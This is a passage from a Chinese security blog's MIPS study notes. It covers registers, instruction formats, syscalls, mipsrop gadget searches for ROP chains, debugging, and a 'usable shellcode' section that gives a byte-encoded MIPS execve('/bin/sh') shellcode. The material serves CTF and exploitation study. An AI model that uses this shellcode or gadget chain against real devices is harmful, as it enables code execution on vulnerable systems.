<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一些处理工作....</span><br><span class="line">.text:0040091C                 move    $sp, $fp</span><br><span class="line">//获取栈上的返回地址</span><br><span class="line">.text:00400920                 lw      $ra, 0x28+var_s4($sp)</span><br><span class="line">.text:00400924                 lw      $fp, 0x28+var_s0($sp)</span><br><span class="line">//通过$ra返回</span><br><span class="line">.text:00400928                 jr      $ra</span><br><span class="line">//栈空间销毁</span><br><span class="line">.text:0040092C                 addiu   $sp, 0x30</span><br></pre></td></tr></table></div></figure>


        <h3 id="总结："   >
          <a href="#总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3>
      <p>总的来说，和x86也是有点相似，不同的就是关于<code>$ra</code>寄存器的使用，以及叶子函数和非叶子函数的区别，还有一些五级流水线机制。</p>

        <h2 id="3-寄存器关系"   >
          <a href="#3-寄存器关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-寄存器关系" class="headerlink" title="3.寄存器关系"></a>3.寄存器关系</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">REGISTER</th>
<th align="left">NAME</th>
<th align="left">USAGE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">$zero</td>
<td align="left">常量0(constant value 0)</td>
</tr>
<tr>
<td align="left">$1</td>
<td align="left">$at</td>
<td align="left">保留给汇编器(Reserved for assembler)</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td align="left">$v0 - $v1</td>
<td align="left">函数调用返回值(values for results and expression evaluation)</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td align="left">$a0-$a3</td>
<td align="left">函数调用参数(arguments)</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td align="left">$t0-$t7</td>
<td align="left">暂时的(或随便用的)</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td align="left">$s0-$s7</td>
<td align="left">保存的(或如果用，需要SAVE/RESTORE的)(saved)</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td align="left">$t8-$t9</td>
<td align="left">暂时的(或随便用的),$t9通常会在函数调用时用到</td>
</tr>
<tr>
<td align="left">$28</td>
<td align="left">$gp</td>
<td align="left">全局指针(Global Pointer),通常有全局变量、常量之类会用到</td>
</tr>
<tr>
<td align="left">$29</td>
<td align="left">$sp</td>
<td align="left">堆栈指针(Stack Pointer)</td>
</tr>
<tr>
<td align="left">$30</td>
<td align="left">$fp</td>
<td align="left">帧指针(Frame Pointer)</td>
</tr>
</tbody></table></div>
<p>说明</p>
<ul>
<li>$0</li>
</ul>
<p>即$zero,该寄存器总是返回零，为0这个有用常数提供了一个简洁的编码形式。</p>
<figure class="highlight mipsasm"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">t0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="comment">#实际为  </span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>,$<span class="number">0</span>,$<span class="built_in">t1</span></span><br></pre></td></tr></table></div></figure>

<p>使用伪指令可以简化任务，汇编程序提供了比硬件更丰富的指令集。</p>
<ul>
<li>$1</li>
</ul>
<p>即 $at，该寄存器为汇编保留，由于I型指令的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 <code>lui</code>（装入高位立即数）和<code>addi</code>两条指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这也是为汇编保留$at的原因之一。</p>
<ul>
<li>$2..$3:($v0-$v1)</li>
</ul>
<p>用于子程序的非浮点结果或返回值，对于子程序如何传递参数及如何返回，MIPS范围有一套约定，堆栈中少数几个位置处的内容装入CPU寄存器，其相应内存位置保留未做定义，当这两个寄存器不够存放返回值时，编译器通过内存来完成。</p>
<ul>
<li>$4..$7:($a0-$a3)</li>
</ul>
<p>用来传递前四个参数给子程序，不够的用堆栈。a0-a3和v0-v1以及ra一起来支持子程序／过程调用，分别用以传递参数，返回结果和存放返回地址。当需要使用更多的寄存器时，就需要堆栈（stack)了,MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。</p>
<ul>
<li>$8..$15:($t0-$t7)</li>
</ul>
<p>临时寄存器，子程序可以使用它们而不用保留。</p>
<ul>
<li>$16..$23:($s0-$s7)</li>
</ul>
<p>保存寄存器，在过程调用过程中需要保留（被调用者保存和恢复，还包括$fp和$ra），MIPS提供了临时寄存器和保存寄存器，这样就减少了寄存器溢出（spilling,即将不常用的变量放到存储器的过程),编译器在编译一个叶（leaf)过程（不调用其它过程的过程）的时候，总是在临时寄存器分配完了才使用需要保存的寄存器。</p>
<ul>
<li>$24..$25:($t8-$t9)</li>
</ul>
<p>同($t0-$t7) $26..$27:($k0,$k1)为操作系统／异常处理保留，至少要预留一个。 异常（或中断）是一种不需要在程序中显示调用的过程。MIPS有个叫异常程序计数器（exception program counter,EPC)的寄存器，属于CP0寄存器，用于保存造成异常的那条指令的地址。查看控制寄存器的唯一方法是把它复制到通用寄存器里，指令<code>mfc0</code>(move from system control)可以将EPC中的地址复制到某个通用寄存器中，通过跳转语句（<code>jr</code>)，程序可以返回到造成异常的那条指令处继续执行。MIPS程序员都必须保留两个寄存器$k0和$k1，供操作系统使用。<br>发生异常时，这两个寄存器的值不会被恢复，编译器也不使用k0和k1,异常处理函数可以将返回地址放到这两个中的任何一个，然后使用jr跳转到造成异常的指令处继续执行。</p>
<ul>
<li>$28:($gp)</li>
</ul>
<p>为了简化静态数据的访问，MIPS软件保留了一个寄存器：全局指针gp(global pointer,$gp)，全局指针指向静态数据区中的运行时决定的地址，在存取位于gp值上下32KB范围内的数据时，只需要一条以gp为基指针的指令即可。在编译时，数据须在以gp为基指针的64KB范围内。</p>
<ul>
<li>$29:($sp)</li>
</ul>
<p>MIPS硬件并不直接支持堆栈，你可以把它用于别的目的，但为了使用别人的程序或让别人使用你的程序，还是要遵守这个约定的，但这和硬件没有关系。</p>
<ul>
<li>$30:($fp)</li>
</ul>
<p>GNU MIPS C编译器使用了帧指针(frame pointer),而SGI的C编译器没有使用，而把这个寄存器当作保存寄存器使用（$s8),这节省了调用和返回开销，但增加了代码生成的复杂性。</p>
<ul>
<li>$31:($ra)</li>
</ul>
<p>存放返回地址，MIPS有个<code>jal</code>(jump-and-link,跳转并 链接)指令，在跳转到某个地址时，把下一条指令的地址放到$ra中。用于支持子程序，例如调用程序把参数放到$a0~$a3,然后<code>jal X</code>跳到X过程，被调过程完成后把结果放到$v0,$v1,然后使用<code>jr $ra</code>返回。</p>

        <h2 id="4-指令"   >
          <a href="#4-指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-指令" class="headerlink" title="4.指令"></a>4.指令</h2>
      
        <h3 id="1-不同类型的指令"   >
          <a href="#1-不同类型的指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-不同类型的指令" class="headerlink" title="(1)不同类型的指令"></a>(1)不同类型的指令</h3>
      
        <h4 id="R型指令：操作寄存器"   >
          <a href="#R型指令：操作寄存器" class="heading-link"><i class="fas fa-link"></i></a><a href="#R型指令：操作寄存器" class="headerlink" title="R型指令：操作寄存器"></a>R型指令：操作寄存器</h4>
      <p>常见指令：<code>add</code>, <code>sub</code>, <code>and</code>, <code>or</code>, <code>nor</code>, <code>slt</code>, <code>sll</code>, <code>srl</code>, <code>jr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png" alt="image-20211230150231733"></p>
<ul>
<li>opcod：操作码 </li>
<li>rs：源寄存器的数量 </li>
<li>rt：源寄存器的数量 </li>
<li>rd：目标寄存器的编号</li>
<li>sham：移位量（操作移位的位数）</li>
<li>Func: 函数（操作码扩展） </li>
</ul>
<p>Sham仅用于操作偏移量的指令（例如<code>stl</code>）</p>

        <h4 id="I型指令：操作常量"   >
          <a href="#I型指令：操作常量" class="heading-link"><i class="fas fa-link"></i></a><a href="#I型指令：操作常量" class="headerlink" title="I型指令：操作常量"></a>I型指令：操作常量</h4>
      <p>常见指令：<code>addi</code>, <code>lw</code>, <code>sw</code>, <code>lh</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code>, <code>ll</code>, <code>sc</code>, <code>lui</code>, <code>andi</code>, <code>ori</code>, <code>beq</code>, <code>bne</code>, <code>slti</code>, <code>sltiu</code></p>
<p><img   src="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0" style=""  alt="img"></p>
<ul>
<li>opcod：操作码</li>
<li>rs：源寄存器的数量</li>
<li>rd：源或目标寄存器的数量</li>
<li>imd: 立即值</li>
</ul>

        <h4 id="J型指令：跳跃寻址"   >
          <a href="#J型指令：跳跃寻址" class="heading-link"><i class="fas fa-link"></i></a><a href="#J型指令：跳跃寻址" class="headerlink" title="J型指令：跳跃寻址"></a>J型指令：跳跃寻址</h4>
      <p>处理器直接跳跃到给定的地址，执行所在地址的指令</p>
<p>常见指令：<code>j</code>, <code>jal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png" alt="image-20211230150255746"></p>
<ul>
<li>Opcod：操作码</li>
<li>Imd：立即值</li>
</ul>

        <h3 id="2-常用指令"   >
          <a href="#2-常用指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-常用指令" class="headerlink" title="(2)常用指令"></a>(2)常用指令</h3>
      <p>其中<code>i</code>表示立即数相关，<code>u</code>表示无符号相关。</p>

        <h4 id="①load-store-指令"   >
          <a href="#①load-store-指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#①load-store-指令" class="headerlink" title="①load/store 指令"></a>①load/store 指令</h4>
      <ul>
<li><p>la：将地址或者标签存入一个寄存器 eg:<code>la $t0,val_1</code>复制val_l的地址到$t0中，val_1是一个Label</p>
</li>
<li><p>li：将立即数存入通用寄存器 eg:<code>li $t1, 40</code> $t1 = 40</p>
</li>
<li><p>lw：从指定的地址加载一个word类型的值到一个寄存器 eg:<code>lw $s0, 0($sp) $s0=MEM[$sp+0]</code></p>
</li>
<li><p>sw：将寄存器的值，存于指定的地址word类型 eg:<code>sw $a0, 0($sp) MEM[$sp+0] = $a0</code></p>
</li>
<li><p>move：寄存器传值 eg：<code>move $t5, $t2 $t5 = $t2</code></p>
</li>
</ul>

        <h4 id="②算数指令"   >
          <a href="#②算数指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#②算数指令" class="headerlink" title="②算数指令"></a>②算数指令</h4>
      <p>算数指令的所有操作都是寄存器，不能是 RAM 地址或间接寻址。且操作数大小都是 word（4byte）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2;		$t0=$t1+$t2;	带符号数相加</span><br><span class="line">sub $t0, $t1, $t2;		$t0=$t1-$t2;	带符号数相减</span><br><span class="line">addi $t0, $t1, 5;		$t0=$t1+5;		有立即数的加法</span><br><span class="line">addu $t0, $t1, $t2;		$t0=$t1+$t2;	无符号数的加法</span><br><span class="line">subu $t0, $t1, $t2;		$t0=$t1-$t2;	带符号数相减</span><br><span class="line">mult $t3, $t3;			(HI, LO) = $t3 * $t4</span><br><span class="line">div $t5, $t6;			$Hi=$t5 mod $t6</span><br><span class="line">mfhi $t0;				$t0 = $Hi</span><br><span class="line">mflo $t1;				$t1 = $Lo</span><br></pre></td></tr></table></div></figure>


        <h4 id="③syscall"   >
          <a href="#③syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#③syscall" class="headerlink" title="③syscall"></a>③syscall</h4>
      <p>产生一个软化中断，实现系统调用；系统调用号存放在 $v0 中，参数在 $a0~$a3 中；</p>
<p>返回值在 $v0 中，如果出错，在 $a3 中返回错误号；在编写 shellcode 时，用到该指令机制</p>
<p>Write(1, “ABCn”, 5) 实现如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addiu $sp, $sp, -32;</span><br><span class="line">li $a0, 1;</span><br><span class="line">lui $t6, 0x4142;</span><br><span class="line">ori $t6, $t6, 0x430a;</span><br><span class="line">sw  $t6, $0($sp);</span><br><span class="line">addiu $a1, $sp, 0;</span><br><span class="line">li $a2, 5;</span><br><span class="line">li $v0, 4004;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>


        <h4 id="④分支跳转指令"   >
          <a href="#④分支跳转指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#④分支跳转指令" class="headerlink" title="④分支跳转指令"></a>④分支跳转指令</h4>
      <p>分支跳转指令本身可以通过比较两个寄存器决定如何跳转；如果想要实现与立即数的比较跳转，需要结合类跳转指令实现</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b target;				无条件跳转到target处</span><br><span class="line">beq $t0, $t1, target;	如果&quot;$t0 == $t1”，跳转到target</span><br><span class="line">blt $t0, $t1, target;	如果“$t0 &lt; $t1”，跳转到target</span><br><span class="line">ble $t0, $t1, target;	如果“$t0 &lt;= $t1” 跳转到target</span><br><span class="line">bgt;</span><br><span class="line">blt;</span><br><span class="line">bne;					类比上</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑤跳转指令"   >
          <a href="#⑤跳转指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤跳转指令" class="headerlink" title="⑤跳转指令"></a>⑤跳转指令</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j target;			无条件跳转target</span><br><span class="line">jr $t3;				跳转到$t3指向的地址处(Jump Register),没有保存地址,一般是函数返回时候用到的</span><br><span class="line">jal target;			跳转到target，并保存返回地址到$ra中，常见于函数调用</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑥子函数的调用"   >
          <a href="#⑥子函数的调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑥子函数的调用" class="headerlink" title="⑥子函数的调用"></a>⑥子函数的调用</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal   sub_routine_label;复制返回地址到$ra中,即当前PC+8的值，程序跳转到sub_routine_label</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑦子函数的返回"   >
          <a href="#⑦子函数的返回" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑦子函数的返回" class="headerlink" title="⑦子函数的返回"></a>⑦子函数的返回</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr    $ra;如果子函数重复嵌套，则将$ra的值保存在堆栈中，因为$ra总是保存当前执行的子函数的返回地址</span><br></pre></td></tr></table></div></figure>



<p>以上大多参考如下</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://valeeraz.github.io/2020/05/08/architecture-mips/" >MIPS汇编语言入门 - Sylvain’s Blog (valeeraz.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259594" >2021第四届强网拟态防御积分赛工控pwn eserver WP - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-常用ROP寻址"   >
          <a href="#5-常用ROP寻址" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-常用ROP寻址" class="headerlink" title="5.常用ROP寻址"></a>5.常用ROP寻址</h2>
      <p>IDA中</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mipsrop</span></span><br><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop=mipsrop.MIPSROPFinder()</span><br><span class="line">mipsrop.find(<span class="string">&quot;&quot;</span>)</span><br><span class="line">mipsrop.stackfinder() <span class="comment">#寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系</span></span><br><span class="line">mipsrop.summary() <span class="comment">#列出所有的可用 rop</span></span><br><span class="line">mipsrop.system() <span class="comment">#寻找命令执行的的rop</span></span><br><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>很多好用ROP的可在libc的scandir_tail类别函数下可以找到</p>

        <h3 id="Shellcode三部曲"   >
          <a href="#Shellcode三部曲" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcode三部曲" class="headerlink" title="Shellcode三部曲"></a><code>Shellcode</code>三部曲</h3>
      
        <h4 id="1-gadget1"   >
          <a href="#1-gadget1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-gadget1" class="headerlink" title="(1)gadget1"></a>(1)gadget1</h4>
      <p>从sp控制寄存器</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lw ra,0x3c(sp);</span><br><span class="line">lw s3,0x2c(sp);</span><br><span class="line">lw s2,0x28(sp);</span><br><span class="line">lw s1,0x24(sp);</span><br><span class="line">lw s0,0x20(sp);</span><br></pre></td></tr></table></div></figure>

<p>这个通常可以在<code>scandir_tail</code>函数中找，或者如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&#x27;jr $ra&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-gadget2"   >
          <a href="#2-gadget2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gadget2" class="headerlink" title="(2)gadget2"></a>(2)gadget2</h4>
      <p>从栈取地址给寄存器，然后跳转之前控制住的寄存器</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu a1,0x18(sp);move t9,s3;jalr t9</span><br></pre></td></tr></table></div></figure>

<p>addiu指令即是取栈地址到a1寄存器，方便之后跳转，如下寻找指令</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;addiu $a1,$sp&quot;</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-gadget3"   >
          <a href="#3-gadget3" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-gadget3" class="headerlink" title="(3)gadget3"></a>(3)gadget3</h4>
      <p>跳转保存栈地址的寄存器，进入<code>shellcode</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move t9,a1;move a1,a2;jr t9</span><br></pre></td></tr></table></div></figure>

<p>如下寻址指令</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;move $t9, $s3&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>因为一般上基本不存在直接取栈地址然后跳转的，所以需要多重跳转来完成。</p>

        <h2 id="🔺可用shellcode"   >
          <a href="#🔺可用shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺可用shellcode" class="headerlink" title="🔺可用shellcode:"></a>🔺可用shellcode:</h2>
      
        <h3 id="1-直接可用的"   >
          <a href="#1-直接可用的" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-直接可用的" class="headerlink" title="(1)直接可用的"></a>(1)直接可用的</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962         ib</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f    ib//</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)      </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873         hs</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e    hs/n</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc   //bin/sh</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu $v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-从栈上取数据的："   >
          <a href="#2-从栈上取数据的：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-从栈上取数据的：" class="headerlink" title="(2)从栈上取数据的："></a>(2)从栈上取数据的：</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x0c\x01\x01\x01&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>对应的如下汇编代码：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw a0,-0x1e4(sp)&quot;</span> 	<span class="comment">#a</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a1,s2&quot;</span>			<span class="comment">#a1</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a2,s2&quot;</span>			<span class="comment">#a2</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw v0,-0x1d8(sp)&quot;</span>	<span class="comment">#v0</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;syscall&quot;</span>			<span class="comment">#syscall</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-调试"   >
          <a href="#6-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-调试" class="headerlink" title="6.调试"></a>6.调试</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./Mplogin</span><br><span class="line">target remote 127.0.0.1:12345</span><br></pre></td></tr></table></div></figure>








        <h1 id="下载库"   >
          <a href="#下载库" class="heading-link"><i class="fas fa-link"></i></a><a href="#下载库" class="headerlink" title="下载库"></a>下载库</h1>
      <p>异构下载库</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install crossbuild-essential-*</span><br><span class="line">apt install qemu-user</span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/">http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E5%BC%82%E6%9E%84/">异构</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/11/02/%E6%B1%87%E7%BC%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">汇编基础</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9BWP/"><span class="paginator-prev__text">强网决赛拟态WP</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="toc-text">
          一、调试问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-ARM%E6%9E%B6%E6%9E%84"><span class="toc-text">
          1.ARM架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0PIE"><span class="toc-text">
          (1)无PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89PIE"><span class="toc-text">
          (2)有PIE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-MIPS%E6%9E%B6%E6%9E%84"><span class="toc-text">
          2.MIPS架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0PIE-1"><span class="toc-text">
          (1)无PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%89PIE-1"><span class="toc-text">
          (2)有PIE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="toc-text">
          项目：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ARM"><span class="toc-text">
